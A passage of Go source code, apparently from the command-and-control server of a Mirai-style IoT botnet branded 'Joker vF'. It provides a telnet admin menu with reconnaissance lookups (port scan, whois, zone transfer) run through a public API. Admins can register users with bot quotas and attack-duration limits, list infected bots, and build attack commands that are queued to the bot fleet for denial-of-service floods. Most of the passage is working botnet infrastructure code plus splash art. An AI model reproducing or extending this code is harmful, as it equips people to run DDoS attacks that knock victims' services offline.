            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResults\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

        if err != nil || cmd == "-PORTSCAN" || cmd == "-portscan" {                  
            this.conn.Write([]byte("\x1b[1;38mIPv4\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37mError... IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResults\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-WHOIS" || cmd == "-whois" {
            this.conn.Write([]byte("\x1b[1;38mIPv4\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResults\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-PING" || cmd == "-ping" {
            this.conn.Write([]byte("\x1b[1;38mIPv4\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResponse\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

        if err != nil || cmd == "-traceroute" || cmd == "-TRACEROUTE" {                  
            this.conn.Write([]byte("\x1b[1;38mIPv4\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37mError... IP Address/Host Name Only!033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResults\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

        if err != nil || cmd == "-resolve" || cmd == "-RESOLVE" {                  
            this.conn.Write([]byte("\x1b[1;38mURL (Without www.)\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResult\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-reversedns" || cmd == "-REVERSEDNS" {
            this.conn.Write([]byte("\x1b[1;38mIPv4\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResult\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-asnlookup" || cmd == "-asnlookup" {
            this.conn.Write([]byte("\x1b[1;38mIPv4\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResult\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-subnetcalc" || cmd == "-SUBNETCALC" {
            this.conn.Write([]byte("\x1b[1;38mIPv4\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResult\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

            if err != nil || cmd == "-zonetransfer" || cmd == "-ZONETRANSFER" {
            this.conn.Write([]byte("\x1b[1;38mIPv4 Or Website (Without www.)\033[38m: \x1b[37m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;38mResult\033[38m: \r\n\033[38m" + locformatted + "\x1b[37m\r\n"))
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDREG" {
            this.conn.Write([]byte("\x1b[1;38m                               ║Username:\x1b[37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;38m                               ║Password:\x1b[37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;38m                               ║Botcount (-1 for All):\x1b[37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;38m                               ║Attack Duration (-1 for Unlimited):\x1b[37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", "                               ║Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;38m                               ║Cooldown (0 for No Cooldown):\x1b[37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", "                               ║Failed to parse Cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[38m- New User Info - \r\n- Username - \033[38m" + new_un + "\r\n\033[0m- Password - \033[38m" + new_pw + "\r\n\033[0m- Bots - \033[38m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[38m" + duration_str + "\r\n\033[0m- Cooldown - \033[38m" + cooldown_str + "   \r\n\x1b[1;38mContinue? (y/n):\x1b[37m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", "                               ║Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;38m                               ║User Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "REMOVEUSER" {
            this.conn.Write([]byte("\x1b[1;38m                               ║Username: \x1b[37m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \x1b[1;38m                               ║Are You Sure You Want To Remove \033[38m" + rm_un + "\x1b[1;38m?(y/n): \x1b[37m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[38m                                Unable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\x1b[1;38m                                User Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "1admin" {
            this.conn.Write([]byte("\x1b[1;38m                               ║Username:\x1b[37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;38m                               ║Password:\x1b[37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;38m                               ║Botcount (-1 for All):\x1b[37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", "                               ║Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;38m                               ║Attack Duration (-1 for Unlimited):\x1b[37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", "                               ║Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;38m                               ║Cooldown (0 for No Cooldown):\x1b[37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", "                               ║Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[38m- New User Info - \r\n- Username - \033[38m" + new_un + "\r\n\033[0m- Password - \033[38m" + new_pw + "\r\n\033[0m- Bots - \033[38m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[38m" + duration_str + "\r\n\033[0m- Cooldown - \033[38m" + cooldown_str + "   \r\n\x1b[1;38mContinue? (y/n):\x1b[37m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", "                               ║Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;38m                               ║Admin Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("                                \033[38m%s \x1b[37m[\033[38m%d\x1b[37m]\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[38m                                Total \x1b[37m[\033[38m%d\x1b[37m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1m                               ║Failed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[34;1m                               ║Bot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[37m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
		                         time.Sleep(5000 * time.Millisecond)                    
                                  this.conn.Write([]byte("\x1b[1;32m                 _.-^^---....,,--             \r\n"))
                                  this.conn.Write([]byte("\x1b[1;35m             _--                  --_         \r\n"))
                                  this.conn.Write([]byte("\x1b[1;35m            <      ╦╔═╗╦╔═╔═╗╦═╗     >)        \r\n"))
                                  this.conn.Write([]byte("\x1b[1;35m            |      ║║ ║╠╩╗║╣ ╠╦╝      |        \r\n"))
                                  this.conn.Write([]byte("\x1b[1;35m             /._  ╚╝╚═╝╩ ╩╚═╝╩╚═   _./         \r\n"))
                                  this.conn.Write([]byte("\x1b[1;32m                ```--. . , ; .--'''            \r\n"))
                                  this.conn.Write([]byte("\x1b[1;35m                      | |   |                  \r\n"))
                                  this.conn.Write([]byte("\x1b[1;35m                   .-=||  | |=-.               \r\n"))
                                  this.conn.Write([]byte("\x1b[1;32m                   `-=#$%&%$#=-'               \r\n"))
                                  this.conn.Write([]byte("\x1b[1;35m                      | ;  :|                 \r\n"))
                                  this.conn.Write([]byte("\x1b[1;32m             _____.,-#%&$@%#&#~,._____         \r\n"))
                                  this.conn.Write([]byte("\033[37m\r\n"))
                                  this.conn.SetDeadline(time.Now().Add(5000 * time.Second))
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m1                   ╚════════════════════════════════════════╝\r\n"))
		time.Sleep(50 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m- - - - - - - Joker vF By @iotnet - - - - - - -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ║\x1b[1;32m  - - - Type help to see the Help Menu - - - - \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                ╚═══════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╔════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ║\x1b[1;32m- -Connection Has Been (ESTABILISHED)- -\x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                    ╚════════════════════════════════════════╝\r\n"))
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 999999)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
